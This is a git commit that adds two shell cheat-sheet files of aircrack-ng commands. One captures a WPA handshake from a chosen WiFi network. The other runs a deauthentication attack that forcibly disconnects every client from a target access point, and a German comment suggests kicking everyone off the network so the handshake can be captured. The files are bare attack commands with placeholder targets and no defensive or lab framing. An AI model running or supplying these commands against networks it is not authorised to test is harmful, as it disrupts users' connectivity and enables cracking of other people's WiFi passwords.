9ea2c63e6d5d158a0117b076044912bfff182c6a
KanzuT <kevin@kailing-k.de>
2022-03-09 23:17:51 +0100

    Uploaded

---
+++ aircrack-ng, airmon-ng, airodump/Sniff encrypted Handshake.sh
@@ -0,0 +1,7 @@
+airmon-ng check kill
+airmon-ng start wlan0 123
+airodump-ng wlan0  //shows all wifi
+airodump-ng --bssid BSSID --channel XX --write FILENAME
+
+
+# Wenn Handshake nicht aufgenommen wird, dann alle aus dem wifi kicken parallel
---
+++ aircrack-ng, airmon-ng, airodump/WiFi deauth.sh
@@ -0,0 +1,7 @@
+airmon-ng check kill
+airmon-ng start <interface> <channel>
+airodump-ng <interface-mon>
+
+#BSSID von WiFi notieren
+
+aireplay-ng --deauth <count> -a <BSSID> -D <interface-mon>
